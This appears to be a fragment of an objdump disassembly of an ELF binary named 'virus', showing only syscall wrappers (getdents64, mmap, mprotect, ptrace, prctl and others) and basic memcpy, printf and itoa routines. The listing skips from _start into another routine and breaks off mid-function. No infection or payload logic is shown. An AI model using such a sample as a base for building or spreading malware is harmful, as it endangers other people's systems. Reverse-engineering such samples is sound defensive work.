
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  4021e9:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021ed:	48 c7 c0 52 00 00 00 	mov    rax,0x52
  4021f4:	0f 05                	syscall 
  4021f6:	48 89 c0             	mov    rax,rax
  4021f9:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021fd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402201:	5d                   	pop    rbp
  402202:	c3                   	ret    

0000000000402203 <_lseek>:
  402203:	f3 0f 1e fa          	endbr64 
  402207:	55                   	push   rbp
  402208:	48 89 e5             	mov    rbp,rsp
  40220b:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40220f:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402213:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402216:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40221a:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40221e:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  402222:	48 c7 c0 08 00 00 00 	mov    rax,0x8
  402229:	0f 05                	syscall 
  40222b:	48 89 c0             	mov    rax,rax
  40222e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402232:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402236:	5d                   	pop    rbp
  402237:	c3                   	ret    

0000000000402238 <_fsync>:
  402238:	f3 0f 1e fa          	endbr64 
  40223c:	55                   	push   rbp
  40223d:	48 89 e5             	mov    rbp,rsp
  402240:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402243:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402247:	48 c7 c0 4a 00 00 00 	mov    rax,0x4a
  40224e:	0f 05                	syscall 
  402250:	48 89 c0             	mov    rax,rax
  402253:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402257:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40225b:	5d                   	pop    rbp
  40225c:	c3                   	ret    

000000000040225d <_mmap>:
  40225d:	f3 0f 1e fa          	endbr64 
  402261:	55                   	push   rbp
  402262:	48 89 e5             	mov    rbp,rsp
  402265:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  402269:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  40226d:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  402271:	48 89 4d c0          	mov    QWORD PTR [rbp-0x40],rcx
  402275:	4c 89 45 b8          	mov    QWORD PTR [rbp-0x48],r8
  402279:	4c 89 4d b0          	mov    QWORD PTR [rbp-0x50],r9
  40227d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  402281:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402285:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  402289:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40228d:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  402291:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402295:	48 8b 7d d8          	mov    rdi,QWORD PTR [rbp-0x28]
  402299:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  40229d:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  4022a1:	4c 8b 55 c0          	mov    r10,QWORD PTR [rbp-0x40]
  4022a5:	4c 8b 45 f8          	mov    r8,QWORD PTR [rbp-0x8]
  4022a9:	4c 8b 4d f0          	mov    r9,QWORD PTR [rbp-0x10]
  4022ad:	48 c7 c0 09 00 00 00 	mov    rax,0x9
  4022b4:	0f 05                	syscall 
  4022b6:	48 89 c0             	mov    rax,rax
  4022b9:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  4022bd:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4022c1:	5d                   	pop    rbp
  4022c2:	c3                   	ret    

00000000004022c3 <_munmap>:
  4022c3:	f3 0f 1e fa          	endbr64 
  4022c7:	55                   	push   rbp
  4022c8:	48 89 e5             	mov    rbp,rsp
  4022cb:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022cf:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022d3:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022d7:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022db:	48 c7 c0 0b 00 00 00 	mov    rax,0xb
  4022e2:	0f 05                	syscall 
  4022e4:	48 89 c0             	mov    rax,rax
  4022e7:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022eb:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022ef:	5d                   	pop    rbp
  4022f0:	c3                   	ret    

00000000004022f1 <_mprotect>:
  4022f1:	f3 0f 1e fa          	endbr64 
  4022f5:	55                   	push   rbp
  4022f6:	48 89 e5             	mov    rbp,rsp
  4022f9:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022fd:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402301:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402304:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402308:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40230c:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  402310:	48 c7 c0 0a 00 00 00 	mov    rax,0xa
  402317:	0f 05                	syscall 
  402319:	48 89 c0             	mov    rax,rax
  40231c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402320:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402324:	5d                   	pop    rbp
  402325:	c3                   	ret    

0000000000402326 <_ptrace>:
  402326:	f3 0f 1e fa          	endbr64 
  40232a:	55                   	push   rbp
  40232b:	48 89 e5             	mov    rbp,rsp
  40232e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402332:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402336:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40233a:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  40233e:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402342:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402346:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40234a:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  40234e:	48 c7 c0 65 00 00 00 	mov    rax,0x65
  402355:	0f 05                	syscall 
  402357:	48 89 c0             	mov    rax,rax
  40235a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40235e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402362:	5d                   	pop    rbp
  402363:	c3                   	ret    

0000000000402364 <_prctl>:
  402364:	f3 0f 1e fa          	endbr64 
  402368:	55                   	push   rbp
  402369:	48 89 e5             	mov    rbp,rsp
  40236c:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402370:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402374:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402378:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  40237c:	4c 89 45 c8          	mov    QWORD PTR [rbp-0x38],r8
  402380:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402384:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402388:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40238c:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402390:	48 c7 c0 9d 00 00 00 	mov    rax,0x9d
  402397:	0f 05                	syscall 
  402399:	48 89 c0             	mov    rax,rax
  40239c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023a0:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023a4:	5d                   	pop    rbp
  4023a5:	c3                   	ret    

00000000004023a6 <_getdents64>:
  4023a6:	f3 0f 1e fa          	endbr64 
  4023aa:	55                   	push   rbp
  4023ab:	48 89 e5             	mov    rbp,rsp
  4023ae:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4023b1:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4023b5:	89 55 e8             	mov    DWORD PTR [rbp-0x18],edx
  4023b8:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4023bc:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023c0:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  4023c4:	48 c7 c0 d9 00 00 00 	mov    rax,0xd9
  4023cb:	0f 05                	syscall 
  4023cd:	48 89 c0             	mov    rax,rax
  4023d0:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023d4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023d8:	5d                   	pop    rbp
  4023d9:	c3                   	ret    

00000000004023da <_gettimeofday>:
  4023da:	f3 0f 1e fa          	endbr64 
  4023de:	55                   	push   rbp
  4023df:	48 89 e5             	mov    rbp,rsp
  4023e2:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4023e6:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4023ea:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4023ee:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023f2:	48 c7 c0 60 00 00 00 	mov    rax,0x60
  4023f9:	0f 05                	syscall 
  4023fb:	48 89 c0             	mov    rax,rax
  4023fe:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402402:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402406:	5d                   	pop    rbp
  402407:	c3                   	ret    

0000000000402408 <_memcpy>:
  402408:	f3 0f 1e fa          	endbr64 
  40240c:	55                   	push   rbp
  40240d:	48 89 e5             	mov    rbp,rsp
  402410:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  402414:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  402418:	89 55 cc             	mov    DWORD PTR [rbp-0x34],edx
  40241b:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40241f:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  402423:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  402427:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40242b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  402432:	eb 1b                	jmp    40244f <_memcpy+0x47>
  402434:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  402438:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  40243b:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40243f:	88 10                	mov    BYTE PTR [rax],dl
  402441:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  402446:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  40244b:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40244f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402452:	39 45 cc             	cmp    DWORD PTR [rbp-0x34],eax
  402455:	77 dd                	ja     402434 <_memcpy+0x2c>
  402457:	90                   	nop
  402458:	90                   	nop
  402459:	5d                   	pop    rbp
  40245a:	c3                   	ret    

000000000040245b <Memset>:
  40245b:	f3 0f 1e fa          	endbr64 
  40245f:	55                   	push   rbp
  402460:	48 89 e5             	mov    rbp,rsp
  402463:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402467:	89 f0                	mov    eax,esi
  402469:	89 55 e0             	mov    DWORD PTR [rbp-0x20],edx
  40246c:	88 45 e4             	mov    BYTE PTR [rbp-0x1c],al
  40246f:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402473:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402477:	8b 45 e0             	mov    eax,DWORD PTR [rbp-0x20]
  40247a:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
  40247d:	eb 0f                	jmp    40248e <Memset+0x33>
  40247f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402483:	0f b6 55 e4          	movzx  edx,BYTE PTR [rbp-0x1c]
  402487:	88 10                	mov    BYTE PTR [rax],dl
  402489:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  40248e:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  402491:	8d 50 ff             	lea    edx,[rax-0x1]
  402494:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  402497:	85 c0                	test   eax,eax
  402499:	75 e4                	jne    40247f <Memset+0x24>
  40249b:	90                   	nop
  40249c:	90                   	nop
  40249d:	5d                   	pop    rbp
  40249e:	c3                   	ret    

000000000040249f <_printf>:
  40249f:	f3 0f 1e fa          	endbr64 
  4024a3:	55                   	push   rbp
  4024a4:	48 89 e5             	mov    rbp,rsp
  4024a7:	48 81 ec 10 01 00 00 	sub    rsp,0x110
  4024ae:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  4024b5:	48 89 b5 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rsi
  4024bc:	48 89 95 60 ff ff ff 	mov    QWORD PTR [rbp-0xa0],rdx
  4024c3:	48 89 8d 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rcx
  4024ca:	4c 89 85 70 ff ff ff 	mov    QWORD PTR [rbp-0x90],r8
  4024d1:	4c 89 8d 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],r9
  4024d8:	84 c0                	test   al,al
  4024da:	74 20                	je     4024fc <_printf+0x5d>
  4024dc:	0f 29 45 80          	movaps XMMWORD PTR [rbp-0x80],xmm0
  4024e0:	0f 29 4d 90          	movaps XMMWORD PTR [rbp-0x70],xmm1
  4024e4:	0f 29 55 a0          	movaps XMMWORD PTR [rbp-0x60],xmm2
  4024e8:	0f 29 5d b0          	movaps XMMWORD PTR [rbp-0x50],xmm3
  4024ec:	0f 29 65 c0          	movaps XMMWORD PTR [rbp-0x40],xmm4
  4024f0:	0f 29 6d d0          	movaps XMMWORD PTR [rbp-0x30],xmm5
  4024f4:	0f 29 75 e0          	movaps XMMWORD PTR [rbp-0x20],xmm6
  4024f8:	0f 29 7d f0          	movaps XMMWORD PTR [rbp-0x10],xmm7
  4024fc:	48 c7 85 20 ff ff ff 	mov    QWORD PTR [rbp-0xe0],0x0
  402503:	00 00 00 00 
  402507:	48 c7 85 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],0x0
  40250e:	00 00 00 00 
  402512:	48 c7 85 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],0x0
  402519:	00 00 00 00 
  40251d:	66 c7 85 38 ff ff ff 	mov    WORD PTR [rbp-0xc8],0x0
  402524:	00 00 
  402526:	c7 85 08 ff ff ff 08 	mov    DWORD PTR [rbp-0xf8],0x8
  40252d:	00 00 00 
  402530:	c7 85 0c ff ff ff 30 	mov    DWORD PTR [rbp-0xf4],0x30
  402537:	00 00 00 
  40253a:	48 8d 45 10          	lea    rax,[rbp+0x10]
  40253e:	48 89 85 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rax
  402545:	48 8d 85 50 ff ff ff 	lea    rax,[rbp-0xb0]
  40254c:	48 89 85 18 ff ff ff 	mov    QWORD PTR [rbp-0xe8],rax
  402553:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40255a:	00 00 00 
  40255d:	e9 6d 02 00 00       	jmp    4027cf <_printf+0x330>
  402562:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402569:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40256c:	3c 25                	cmp    al,0x25
  40256e:	74 31                	je     4025a1 <_printf+0x102>
  402570:	83 bd 4c ff ff ff 00 	cmp    DWORD PTR [rbp-0xb4],0x0
  402577:	75 28                	jne    4025a1 <_printf+0x102>
  402579:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402580:	ba 01 00 00 00       	mov    edx,0x1
  402585:	48 89 c6             	mov    rsi,rax
  402588:	bf 01 00 00 00       	mov    edi,0x1
  40258d:	e8 b9 fb ff ff       	call   40214b <_write>
  402592:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  402599:	00 00 00 
  40259c:	e9 26 02 00 00       	jmp    4027c7 <_printf+0x328>
  4025a1:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4025a8:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4025ab:	3c 25                	cmp    al,0x25
  4025ad:	0f 84 0a 02 00 00    	je     4027bd <_printf+0x31e>
  4025b3:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4025ba:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4025bd:	0f be c0             	movsx  eax,al
  4025c0:	83 f8 78             	cmp    eax,0x78
  4025c3:	0f 84 61 01 00 00    	je     40272a <_printf+0x28b>
  4025c9:	83 f8 78             	cmp    eax,0x78
  4025cc:	0f 8f c5 01 00 00    	jg     402797 <_printf+0x2f8>
  4025d2:	83 f8 75             	cmp    eax,0x75
  4025d5:	74 79                	je     402650 <_printf+0x1b1>
  4025d7:	83 f8 75             	cmp    eax,0x75
  4025da:	0f 8f b7 01 00 00    	jg     402797 <_printf+0x2f8>
  4025e0:	83 f8 64             	cmp    eax,0x64
  4025e3:	0f 84 d4 00 00 00    	je     4026bd <_printf+0x21e>
  4025e9:	83 f8 73             	cmp    eax,0x73
  4025ec:	0f 85 a5 01 00 00    	jne    402797 <_printf+0x2f8>
  4025f2:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4025f8:	83 f8 2f             	cmp    eax,0x2f
  4025fb:	77 23                	ja     402620 <_printf+0x181>
  4025fd:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402604:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40260a:	89 d2                	mov    edx,edx
  40260c:	48 01 d0             	add    rax,rdx
  40260f:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402615:	83 c2 08             	add    edx,0x8
  402618:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40261e:	eb 12                	jmp    402632 <_printf+0x193>
  402620:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402627:	48 8d 50 08          	lea    rdx,[rax+0x8]
  40262b:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402632:	48 8b 00             	mov    rax,QWORD PTR [rax]
  402635:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  40263c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  402643:	48 89 c7             	mov    rdi,rax
  402646:	e8 cd 04 00 00       	call   402b18 <_puts>
  40264b:	e9 61 01 00 00       	jmp    4027b1 <_printf+0x312>
  402650:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402656:	83 f8 2f             	cmp    eax,0x2f
  402659:	77 23                	ja     40267e <_printf+0x1df>
  40265b:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402662:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402668:	89 d2                	mov    edx,edx
  40266a:	48 01 d0             	add    rax,rdx
  40266d:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402673:	83 c2 08             	add    edx,0x8
  402676:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40267c:	eb 12                	jmp    402690 <_printf+0x1f1>
  40267e:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402685:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402689:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402690:	8b 00                	mov    eax,DWORD PTR [rax]
  402692:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  402698:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  40269e:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  4026a5:	48 89 d6             	mov    rsi,rdx
  4026a8:	48 89 c7             	mov    rdi,rax
  4026ab:	e8 38 01 00 00       	call   4027e8 <itoa>
  4026b0:	48 89 c7             	mov    rdi,rax
  4026b3:	e8 60 04 00 00       	call   402b18 <_puts>
  4026b8:	e9 f4 00 00 00       	jmp    4027b1 <_printf+0x312>
  4026bd:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4026c3:	83 f8 2f             	cmp    eax,0x2f
  4026c6:	77 23                	ja     4026eb <_printf+0x24c>
  4026c8:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4026cf:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026d5:	89 d2                	mov    edx,edx
  4026d7:	48 01 d0             	add    rax,rdx
  4026da:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026e0:	83 c2 08             	add    edx,0x8
  4026e3:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  4026e9:	eb 12                	jmp    4026fd <_printf+0x25e>
  4026eb:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4026f2:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4026f6:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4026fd:	8b 00                	mov    eax,DWORD PTR [rax]
  4026ff:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  402705:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  40270b:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  402712:	48 89 d6             	mov    rsi,rdx
  402715:	48 89 c7             	mov    rdi,rax
  402718:	e8 cb 00 00 00       	call   4027e8 <itoa>
  40271d:	48 89 c7             	mov    rdi,rax
  402720:	e8 f3 03 00 00       	call   402b18 <_puts>
  402725:	e9 87 00 00 00       	jmp    4027b1 <_printf+0x312>
  40272a:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402730:	83 f8 2f             	cmp    eax,0x2f
  402733:	77 23                	ja     402758 <_printf+0x2b9>
  402735:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  40273c:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402742:	89 d2                	mov    edx,edx
  402744:	48 01 d0             	add    rax,rdx
  402747:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40274d:	83 c2 08             	add    edx,0x8
  402750:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  402756:	eb 12                	jmp    40276a <_printf+0x2cb>
  402758:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  40275f:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402763:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  40276a:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40276d:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  402774:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40277b:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  402782:	48 89 d6             	mov    rsi,rdx
  402785:	48 89 c7             	mov    rdi,rax
  402788:	e8 dd 01 00 00       	call   40296a <itox>
  40278d:	48 89 c7             	mov    rdi,rax
  402790:	e8 83 03 00 00       	call   402b18 <_puts>
  402795:	eb 1a                	jmp    4027b1 <_printf+0x312>
  402797:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40279e:	ba 01 00 00 00       	mov    edx,0x1
  4027a3:	48 89 c6             	mov    rsi,rax
  4027a6:	bf 01 00 00 00       	mov    edi,0x1
  4027ab:	e8 9b f9 ff ff       	call   40214b <_write>
  4027b0:	90                   	nop
  4027b1:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  4027b8:	00 00 00 
  4027bb:	eb 0a                	jmp    4027c7 <_printf+0x328>
  4027bd:	c7 85 4c ff ff ff 01 	mov    DWORD PTR [rbp-0xb4],0x1
  4027c4:	00 00 00 
  4027c7:	48 83 85 f8 fe ff ff 	add    QWORD PTR [rbp-0x108],0x1
  4027ce:	01 
  4027cf:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  4027d6:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  4027d9:	84 c0                	test   al,al
  4027db:	0f 85 81 fd ff ff    	jne    402562 <_printf+0xc3>
  4027e1:	b8 01 00 00 00       	mov    eax,0x1
  4027e6:	c9                   	leave  
  4027e7:	c3                   	ret    

00000000004027e8 <itoa>:
  4027e8:	f3 0f 1e fa          	endbr64 
  4027ec:	55                   	push   rbp
  4027ed:	48 89 e5             	mov    rbp,rsp
  4027f0:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4027f4:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4027f8:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4027ff:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  402803:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  40280a:	66 66 66 
  40280d:	48 89 c8             	mov    rax,rcx
  402810:	48 f7 ea             	imul   rdx
  402813:	48 c1 fa 02          	sar    rdx,0x2
  402817:	48 89 c8             	mov    rax,rcx
  40281a:	48 c1 f8 3f          	sar    rax,0x3f
  40281e:	48 29 c2             	sub    rdx,rax
  402821:	48 89 d0             	mov    rax,rdx
  402824:	48 c1 e0 02          	shl    rax,0x2
  402828:	48 01 d0             	add    rax,rdx
  40282b:	48 01 c0             	add    rax,rax
  40282e:	48 29 c1             	sub    rcx,rax
  402831:	48 89 ca             	mov    rdx,rcx
  402834:	89 d0                	mov    eax,edx
  402836:	8d 48 30             	lea    ecx,[rax+0x30]
  402839:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40283c:	48 63 d0             	movsxd rdx,eax
  40283f:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402843:	48 01 d0             	add    rax,rdx
  402846:	89 ca                	mov    edx,ecx
  402848:	88 10                	mov    BYTE PTR [rax],dl
  40284a:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  40284e:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  402855:	66 66 66 
  402858:	48 89 c8             	mov    rax,rcx
  40285b:	48 f7 ea             	imul   rdx
